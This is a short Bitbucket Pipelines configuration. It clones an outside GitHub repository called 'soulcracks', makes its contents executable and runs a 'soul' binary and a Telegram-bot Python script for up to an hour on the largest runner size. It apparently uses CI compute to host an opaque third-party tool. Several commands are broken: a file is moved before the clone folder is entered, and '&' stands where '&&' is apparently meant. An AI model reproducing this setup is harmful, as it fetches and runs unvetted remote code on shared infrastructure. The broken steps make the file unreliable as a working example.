image: python:3.9

pipelines:
  default:
    - step:
        name: Build and Run
        size: 8x
        caches:
          - pip
        script:
          - apt-get update && apt-get install -y gcc libpthread-stubs0-dev
          - pip install telebot pymongo aiohttp
          - git clone https://github.com/Soulhonvxb5091/soulcracks
          - mv soul.py $HOME
          - cd soulcracks
          - mv soul $HOME & cd
          - chmod +x *
          - chmod +x soul && timeout 3600 python3 soul.py
